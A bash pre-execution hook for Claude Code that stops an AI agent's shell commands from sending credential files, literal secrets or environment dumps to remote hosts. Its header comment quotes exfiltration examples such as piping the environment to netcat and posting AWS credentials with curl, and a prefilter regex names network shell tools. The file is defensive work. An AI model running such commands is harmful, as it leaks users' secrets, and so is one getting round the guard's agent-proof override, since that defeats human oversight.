#!/usr/bin/env bash
# guards/hooks/outbound-guard.sh — PreToolUse hook on Bash: stops a command from
# SENDING credential material to a remote host.
#
# WHY: the output hooks see what comes back from a command, and the publish
# guard sees a short list of publish verbs. Neither sees a network client sending
# a credential store (curl -d @~/.aws/credentials, env | nc host 9, scp key host:).
# That is the most direct way a credential leaves the machine, and an agent can do
# it in one command.
#
# WHAT IT CHECKS. First, literal credentials in the command text (a vendor-shaped
# token or AWS key id, a private-key header, a value from the session's own
# environment, an Authorization or X-Api-Key value, -u user:pw, URL userinfo,
# password= in a body): the parser flags the candidates by flag name, and the
# secret scanner (the guards-unified service, else the local scan.sh) confirms
# and locates them. Sure things deny in every mode; ambiguous ones ask where a
# person can answer and deny elsewhere, the same rule as publish-guard. A deny
# shows the scanner-redacted line and teaches the safe forms; it never prints
# the value. Second, by reference:
#   - a FILE a client would read and send: curl -d/--data*/-F/-T/-H @file,
#     wget --post-file/--body-file, HTTPie field@file, scp/rsync/sftp sources,
#     `client < file`, `cat file | client`, `client "$(cat file)"`. The file is
#     classified with credclass-lib.sh, the same lists as credfile-guard: a
#     credential store (cloud credentials, SSH key, docker config, netrc, any
#     file holding a private-key header) denies; .env, kubeconfig, .npmrc, .pypirc
#     and terraform state ask where a person can answer and deny elsewhere.
#   - the WHOLE ENVIRONMENT (env, printenv, set, export -p) piped into a client:
#     deny; a filtered dump (env | grep ... | client) asks or denies by mode.
# The `@` is not the problem: curl -H @headers.txt is the recommended safe form and
# is allowed. What matters is what the file IS. Variable, config-file (-K), netrc
# and stdin forms put no credential in the command and are not flagged.
#
# NOT SEEN (documented in docs/LIMITS.md): a file named through a variable or a
# substitution (noted, allowed), aliases, functions, scripts, other interpreters,
# state across commands, cloud CLIs. Best effort, not a sandbox.
#
# FAIL CLOSED for a command that names a client: if the check cannot finish
# (deadline, crash, no awk) the call is denied with the reason. A parser limit
# (unbalanced quoting, over 8 KB, depth cap) is not a failure: no decision, plus a
# one-line note. A command that names no client costs one prefilter (a bash regex
# on the raw payload) and exits before anything else runs.
#
# OVERRIDE: GUARDS_ALLOW_OUTBOUND_SECRETS=1 in the environment Claude Code was
# started from. The caller of this hook is usually an AI agent, so the override
# must be something the agent cannot type for itself: set in front of a command
# it changes nothing, because it is read from the hook's own environment.
# GUARDS_OUTBOUND_ASK: 1 (default) asks where a person can answer, 0 denies in
# every mode, force asks in every mode.
#
# Never returns updatedInput, so it can coexist with the other PreToolUse hooks on
# Bash (deny beats ask beats allow, whatever the order).

set -uo pipefail

[ "${GUARDS_ALLOW_OUTBOUND_SECRETS:-0}" = "1" ] && exit 0

HOOK_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Prefilter, outer run only: a command that names no client never gets further.
# It runs BEFORE the deadline wrapper (the wrapper costs about 7 ms by itself).
if [ -z "${GUARDS_DEADLINE_INNER:-}" ]; then
  RAW="$(cat)"
  PREFILTER_RE='(^|[^A-Za-z0-9_./-])(curl|wget|http|https|xh|nc|ncat|netcat|scp|rsync|sftp|ssh|ftp|telnet|socat)([^A-Za-z0-9_-]|$)'
  [[ "$RAW" =~ $PREFILTER_RE ]] || exit 0
  exec 0<<< "$RAW"
  # shellcheck source=guards/hooks/deadline-lib.sh
  . "$HOOK_DIR/deadline-lib.sh" && guards_deadline deny 9
fi

RAW="$(cat)"
# shellcheck source=guards/hooks/json-lib.sh
. "$HOOK_DIR/json-lib.sh"   # HAVE_JQ, jfield, emit_pre, emit_context

deny() {
  emit_pre deny "$1"
  exit 0
}

if [ "$HAVE_JQ" -eq 1 ]; then
  # One jq call for the four fields (a call per field is about 10 ms each).
  { IFS= read -r TOOL_NAME; IFS= read -r CWD; IFS= read -r PERM_MODE; CMD="$(cat)"; } < <(
    printf '%s' "$RAW" | jq -r '(.tool_name // ""), (.cwd // ""), (.permission_mode // ""), (.tool_input.command // "")' 2> /dev/null
  )
else
  TOOL_NAME="$(jfield tool_name)"
  CWD="$(jfield cwd)"
  PERM_MODE="$(jfield permission_mode)"
  CMD="$(jfield command)"
fi

# The payload could not be read and there is no jq to say why: the call names a
# client (the prefilter matched), so refuse rather than guess.
if [ "$HAVE_JQ" -eq 0 ] && [ -z "$TOOL_NAME" ]; then
  deny "Blocked by guards outbound-guard: jq is not installed and the hook payload could not be read without it, so this call cannot be checked. Install jq (apt install jq, brew install jq) and retry. If the user really wants the call to go through unchecked, they must start Claude Code with GUARDS_ALLOW_OUTBOUND_SECRETS=1."
fi
[ "$TOOL_NAME" = "Bash" ] || exit 0
[ -n "$CMD" ] || exit 0
[ -n "$CWD" ] || CWD="$PWD"

SNIFF_MAX_BYTES="${CREDFILE_SNIFF_MAX_BYTES:-10485760}"
PRIVATE_KEY_RE='-----BEGIN ([A-Z0-9]+ )*PRIVATE KEY( BLOCK)?-----'

# shellcheck source=guards/hooks/credclass-lib.sh
. "$HOOK_DIR/credclass-lib.sh" 2> /dev/null || deny "Blocked by guards outbound-guard: its classification library credclass-lib.sh is missing or unreadable next to the hook ($HOOK_DIR/credclass-lib.sh), so this call cannot be checked and is denied. Reinstall or update the guards plugin."
# shellcheck source=guards/hooks/outbound-lib.sh
. "$HOOK_DIR/outbound-lib.sh" 2> /dev/null || deny "Blocked by guards outbound-guard: its parser library outbound-lib.sh is missing or unreadable next to the hook ($HOOK_DIR/outbound-lib.sh), so this call cannot be checked and is denied. Reinstall or update the guards plugin."

# A person can answer an ask only in these modes; elsewhere Claude Code answers it
# itself (verified live in auto mode), so the guard denies instead.
HUMAN=0
case "$PERM_MODE" in default | acceptEdits | plan) HUMAN=1 ;; esac
[ "${GUARDS_OUTBOUND_ASK:-1}" = "force" ] && HUMAN=1
CAN_ASK=0
{ [ "${GUARDS_OUTBOUND_ASK:-1}" = "1" ] || [ "${GUARDS_OUTBOUND_ASK:-1}" = "force" ]; } && [ "$HUMAN" -eq 1 ] && CAN_ASK=1

SAFE_FORMS="To authenticate a request without putting the credential in the command, keep it in a file only you can read and pass that file: for curl use -K <config file>, --netrc-file <file> or -H @<headers file>; for wget use --config <file>. To check that a key works without sending it, use ssh -i <key> or ssh-keygen -l -f <key>."
OVERRIDE="If the user really wants this to go through, they must start Claude Code with GUARDS_ALLOW_OUTBOUND_SECRETS=1."
# Case ids in guards/tests/outbound-safeforms.test.sh that prove each safe form
# the messages name; outbound-guard.test.sh checks every one of them exists there.
# shellcheck disable=SC2034  # read by guards/tests/outbound-guard.test.sh, not by this script
SAFE_FORM_IDS="curl-var-header curl-K-file curl-netrc-file curl-H-at-file curl-d-at-file curl-stdin-body wget-config"
# Scanner rules whose match can be text that merely documents a key or a URL shape;
# they go to a person. Everything else is a sure thing. publish-guard's AMBIGUOUS
# list plus curl-auth-user and curl-auth-header, gitleaks' two curl-command rules:
# they match a literal -u user:pw or an Authorization-style header value of any
# shape, which is ambiguous here (a vendor-shaped token is caught by its own rule
# and denies). outbound-guard.test.sh checks the two lists differ by exactly those.
AMBIGUOUS=" secret-lead-in url-password url-query-secret auth-header cookie-header cli-password-flag netrc-password pgpass-password k8s-env-value json-key-value azure-client-secret gcloud-oauth-token bcrypt-hash generic-api-key curl-auth-user curl-auth-header "
# A placeholder the sandbox's credential masking puts in a command is not a
# credential. The real sentinel format is not verified here; override with
# GUARDS_OUTBOUND_SENTINEL_RE (an extended regular expression).
SENTINEL_RE="${GUARDS_OUTBOUND_SENTINEL_RE:-SANDBOX_MASKED_[A-Za-z0-9]+}"
SECRET_SCAN="${GUARDS_SECRET_SCAN:-$(dirname "$HOOK_DIR")/vendor/secret-guard-core/scan.sh}"
LIT_SURE=""     # parser: vendor-shaped values, by flag
LIT_AMBIG=""    # parser: ambiguous literals, by flag
LIT_KIND=""     # scanner result: deny | ask | ""
LIT_FROM_RULES=0  # 1 when the message came from a matched scanner rule
LIT_MSG=""
CLIENT_NAME=""

DENY_MSG=""
ASK_MSG=""
NOTES=""

note() { # note TEXT -- one line each, joined
  NOTES="${NOTES:+$NOTES }$1"
}

# where_of CLIENT FLAG -> how the file reaches the client, in words. Never a path.
where_of() {
  local client="$1" flag="$2"
  case "$flag" in
    --[A-Za-z]) printf '%s -%s' "$client" "${flag#--}" ;;
    -*) printf '%s %s' "$client" "$flag" ;;
    stdin) printf '%s reading it from standard input (<)' "$client" ;;
    source) printf '%s copying it as a source' "$client" ;;
    field@) printf '%s sending it as a request field' "$client" ;;
    *) printf '%s (%s)' "$client" "$flag" ;;
  esac
}

# flag_cred WHY WHERE -- WHY is the credclass reason ("AWS credentials file").
flag_cred() {
  local why="$1" where="$2"
  if is_ask_class "$why"; then
    if [ "$CAN_ASK" -eq 1 ]; then
      [ -n "$ASK_MSG" ] || ASK_MSG="guards outbound-guard: this would send the contents of a file the guards treat as credential-adjacent ($why) to a remote host, via $where. Approve only if you really mean to send it. ${SAFE_FORMS}"
      return 0
    fi
    local mode=""
    [ "${GUARDS_OUTBOUND_ASK:-1}" != "0" ] && mode=" [permission mode '${PERM_MODE:-unknown}' has no person to answer an approval prompt, so this is blocked instead of asked]"
    [ -n "$DENY_MSG" ] || DENY_MSG="Blocked by guards outbound-guard: this would send credential-adjacent material ($why) to a remote host, via $where${mode}. ${SAFE_FORMS} ${OVERRIDE}"
    return 0
  fi
  [ -n "$DENY_MSG" ] || DENY_MSG="Blocked by guards outbound-guard: this would send credential material ($why) to a remote host, via $where. Send the data you mean to send, not the credential store. ${SAFE_FORMS} ${OVERRIDE}"
}

classify_path() { # classify_path RAWPATH WHERE
  local raw="$1" where="$2" p why expanded e
  [ -n "$raw" ] || return 0
  case "$raw" in -) return 0 ;; esac
  case "$raw" in
    *'*'* | *'?'* | *'['*)
      expanded="$(cd "$CWD" 2> /dev/null && compgen -G "$raw" | LC_ALL=C sort | head -n 20)"
      if [ -z "$expanded" ] && [ "${raw#\~}" != "$raw" ]; then
        expanded="$(compgen -G "${HOME}/${raw#\~/}" | LC_ALL=C sort | head -n 20)"
      fi
      while IFS= read -r e; do [ -n "$e" ] && classify_path "$e" "$where"; done <<< "$expanded"
      return 0 ;;
  esac
  p="$(resolve_path "$raw")"
  [ -n "$p" ] || return 0
  if why="$(sensitive_reason "$p")"; then
    flag_cred "$why" "$where"
  elif [ -d "$p" ] && why="$(sensitive_dir_reason "$p")"; then
    flag_cred "$why" "$where"
  fi
  return 0
}

HAVE_CLIENT=0
# A sandbox placeholder in the command is not a credential: take it out before
# anything looks at the text (the parser and the scanner both read CMD_CLEAN).
CMD_CLEAN="$(printf '%s' "$CMD" | sed -E "s/${SENTINEL_RE}//g")"
RECS="$(printf '%s' "$CMD_CLEAN" | outbound_parse)"
while IFS=$'\t' read -r kind a b c; do
  case "$kind" in
    C) HAVE_CLIENT=1; [ -n "$CLIENT_NAME" ] || CLIENT_NAME="$a" ;;
    F) classify_path "$c" "$(where_of "$a" "$b")" ;;
    S)
      case "$b" in
        envdump)
          [ -n "$DENY_MSG" ] || DENY_MSG="Blocked by guards outbound-guard: the whole environment ($c) would be sent to a remote host by $a. It holds every secret the session can see. Send only the variables you need, by name, or write them to a file you intend to send. ${SAFE_FORMS} ${OVERRIDE}" ;;
        envdump-filtered)
          if [ "$CAN_ASK" -eq 1 ]; then
            [ -n "$ASK_MSG" ] || ASK_MSG="guards outbound-guard: a filtered dump of the environment ($c, then a filter) would be sent to a remote host by $a. Approve only if the filter leaves out every secret. ${SAFE_FORMS}"
          else
            [ -n "$DENY_MSG" ] || DENY_MSG="Blocked by guards outbound-guard: a filtered dump of the environment ($c, then a filter) would be sent to a remote host by $a, and permission mode '${PERM_MODE:-unknown}' has no person to approve it. Send only the variables you need, by name. ${SAFE_FORMS} ${OVERRIDE}"
          fi ;;
        pipearg) classify_path "$c" "a pipe into $a" ;;
        subst) classify_path "$c" "a command substitution passed to $a" ;;
        redir) classify_path "$c" "$a reading it from standard input (<)" ;;
        stdin-op) ;;
      esac ;;
    U) note "guards outbound-guard: a file operand of $a is named through a variable or substitution, so it could not be checked (allowed). The guard only sees paths written in the command." ;;
    X)
      if [ "$a" = "awk-failed" ]; then
        deny "Blocked by guards outbound-guard: the command parser (awk) could not run, so this command, which names a network client, cannot be checked and is denied. Check that a POSIX awk is on PATH. $OVERRIDE"
      fi
      note "guards outbound-guard: this command was not fully checked ($a); the literal-credential and file checks that could run did." ;;
    L)
      # a=client b=sure|ambig c=flag. Names the flag, never the value.
      case "$b" in
        sure) LIT_SURE="${LIT_SURE:+$LIT_SURE, }$(where_of "$a" "$c")" ;;
        ambig) LIT_AMBIG="${LIT_AMBIG:+$LIT_AMBIG, }$(where_of "$a" "$c")" ;;
      esac ;;
  esac
done <<< "$RECS"

# --- literal credentials in the command text --------------------------------
LIT_WHAT="What to do:
 1. Keep the credential out of the command line. Put it in a file only you can read and pass the file: curl -K <config file>, --netrc-file <file> or -H @<headers file>; wget --config <file>.
 2. Send a body from a file or standard input, curl -d @<file> or -d @-, not the value inline.
 3. A variable reference (-H \"X-Api-Key: \$KEY\") keeps the value out of the command text and the transcript, but not out of the process list: ps shows it to other users of the machine.
 4. Avoid curl -v / --verbose, wget -d and http --verbose when a header carries a credential: they print it back.
 5. If it is only a key NAME or a documented example, reword it. GUARDS_ALLOW_OUTBOUND_SECRETS=1 works only when set in the environment Claude Code was STARTED from; in front of a command it does nothing. Never disable the guards; ask the user to review a false positive."

# locate IN OUT -> up to 5 numbered lines, each as the scanner redacts it, then "#TOTAL n".
locate_cmd() {
  LC_ALL=C diff -U0 -- "$1" "$2" 2> /dev/null | LC_ALL=C awk -v max=5 '
    function flush(   i, t, idx) {
      if (!inh || nn == 0) return
      for (i = 1; i <= nn; i++) {
        idx = (no == nn) ? a + i - 1 : a
        if (idx < 1) idx = 1
        t = news[i]; gsub(/[[:cntrl:]]/, " ", t)
        if (length(t) > 200) t = substr(t, 1, 200) "..."
        total++
        if (total <= max) printf "  %d. the command text, line %s: %s\n", total, idx, t
      }
    }
    /^@@ / { flush(); s = $0; sub(/^@@ -/, "", s); split(s, p, " "); split(p[1], o, ","); a = o[1] + 0; no = (o[2] == "" ? 1 : o[2] + 0); inh = 1; nn = 0; next }
    !inh { next }
    /^\+/ { news[++nn] = substr($0, 2) }
    END { flush(); print "#TOTAL " total + 0 }'
}

# literal_scan: run the secret scanner over the command text. Sets LIT_KIND and
# LIT_MSG. Called only for a command that names a client.
literal_scan() {
  local w in rules r hard=0 loc where="" total=0 mode_note="" cname="${CLIENT_NAME:-a network client}"
  w="$(mktemp -d 2> /dev/null)" || {
    LIT_KIND=deny
    LIT_MSG="Blocked by guards outbound-guard: no temporary directory could be created, so the text of this command, which names a network client, cannot be checked for a credential. $OVERRIDE"
    return 0
  }
  in="$w/in.txt"
  printf '%s\n' "$CMD_CLEAN" > "$in"
  SS_WORK="$w"
  export SS_LOCAL_TIMEOUT="${SS_LOCAL_TIMEOUT:-4}" SS_ENV_TIMEOUT="${SS_ENV_TIMEOUT:-2}"
  # shellcheck source=guards/hooks/secret-scan-lib.sh
  . "$HOOK_DIR/secret-scan-lib.sh"
  if ! secret_scan "$in"; then
    if [ "${SS_TIMED_OUT:-0}" = 1 ]; then
      LIT_MSG="Blocked by guards outbound-guard: the local secret scan did not finish in time, so the text of this command, which names $cname, cannot be checked for a credential before it is sent. Fail-closed: sent text cannot be recalled. $OVERRIDE"
    else
      LIT_MSG="Blocked by guards outbound-guard: no secret scanner could run (the guards-unified service is unreachable and the local scanner at $SECRET_SCAN is missing or failed), so the text of this command, which names $cname, cannot be checked for a credential before it is sent. Start the service (docker compose up -d in the plugin's docker directory) or install gitleaks and jq. $OVERRIDE"
    fi
    LIT_KIND=deny
    rm -rf "$w"
    return 0
  fi
  rules="$SS_RULES"
  if [ -n "$rules" ]; then
    for r in $rules; do
      case "$AMBIGUOUS" in *" $r "*) ;; *) hard=1 ;; esac
    done
    local loc_out
    cp -- "$SS_OUT" "$w/out.norm" 2> /dev/null
    [ -z "$(tail -c1 -- "$w/out.norm" 2> /dev/null)" ] || printf '\n' >> "$w/out.norm"
    loc_out="$(locate_cmd "$in" "$w/out.norm")"
    total="$(printf '%s\n' "$loc_out" | sed -n 's/^#TOTAL //p')"; total="${total:-0}"
    where="$(printf '%s\n' "$loc_out" | grep -v '^#TOTAL ')"
  fi
  rm -rf "$w"
  [ -n "$rules" ] || return 0
  LIT_FROM_RULES=1
  local rules_csv; rules_csv="$(printf '%s' "$rules" | tr ' ' ',')"
  local shown="$total"; [ "$shown" -gt 5 ] && shown=5
  local explain
  if [ -n "$where" ]; then
    explain="
Where (first $shown of $total; each line is shown as the scanner redacts it, the value itself is never printed):
$where
$LIT_WHAT"
  else
    explain="
Where: the scanner could not point to a line (it matched without changing the text).
$LIT_WHAT"
  fi
  if [ "$hard" -eq 1 ]; then
    LIT_KIND=deny
    LIT_MSG="Blocked by guards outbound-guard: this command would send text that looks like a credential (detector rule(s): $rules_csv) to a remote host via $cname. Do not put the value in the command, not even a prefix.${explain}"
  elif [ "$CAN_ASK" -eq 1 ]; then
    LIT_KIND=ask
    LIT_MSG="guards outbound-guard: this command may send a credential (detector rule(s): $rules_csv) to a remote host via $cname. Approve only if it shows a SHAPE or a documented example. If it contains a real value, deny it and use one of the safe forms.${explain}"
  else
    [ "${GUARDS_OUTBOUND_ASK:-1}" != "0" ] && mode_note=" [permission mode '${PERM_MODE:-unknown}' has no person to answer an approval prompt, so an ambiguous match is blocked instead of asked]"
    LIT_KIND=deny
    LIT_MSG="Blocked by guards outbound-guard: this command may send a credential (detector rule(s): $rules_csv) to a remote host via $cname${mode_note}. Do not put the value in the command, not even a prefix.${explain}"
  fi
  return 0
}

if [ "$HAVE_CLIENT" -eq 1 ] && [ -z "$DENY_MSG" ]; then
  if [ -n "$LIT_SURE" ]; then
    # The parser saw a vendor-shaped value (or a private-key header) as an operand:
    # that stands even if no scanner can run. The scanner, when it matched a rule,
    # adds the located, redacted line; otherwise the message names the flag.
    LIT_FROM_RULES=0
    literal_scan
    if [ "$LIT_KIND" = deny ] && [ "$LIT_FROM_RULES" -eq 1 ]; then
      DENY_MSG="$LIT_MSG"
    else
      DENY_MSG="Blocked by guards outbound-guard: this command would send a literal credential to a remote host: a vendor-shaped value in $LIT_SURE. Do not put the value in the command, not even a prefix.
$LIT_WHAT"
    fi
  else
    literal_scan
    case "$LIT_KIND" in
      deny) DENY_MSG="$LIT_MSG" ;;
      ask) [ -n "$ASK_MSG" ] || ASK_MSG="$LIT_MSG" ;;
      *)
        if [ -n "$LIT_AMBIG" ]; then
          if [ "$CAN_ASK" -eq 1 ]; then
            [ -n "$ASK_MSG" ] || ASK_MSG="guards outbound-guard: $LIT_AMBIG may carry a literal credential in the command text. Approve only if it is not a real value.
$LIT_WHAT"
          else
            DENY_MSG="Blocked by guards outbound-guard: $LIT_AMBIG may carry a literal credential in the command text, and permission mode '${PERM_MODE:-unknown}' has no person to approve it. Do not put the value in the command, not even a prefix.
$LIT_WHAT"
          fi
        fi ;;
    esac
  fi
fi

[ "$HAVE_CLIENT" -eq 1 ] || [ -n "$NOTES" ] || exit 0
[ -z "$DENY_MSG" ] || deny "$DENY_MSG"
if [ -n "$ASK_MSG" ]; then
  emit_pre ask "$ASK_MSG"
  exit 0
fi
[ -z "$NOTES" ] || emit_context PreToolUse "$NOTES"
exit 0
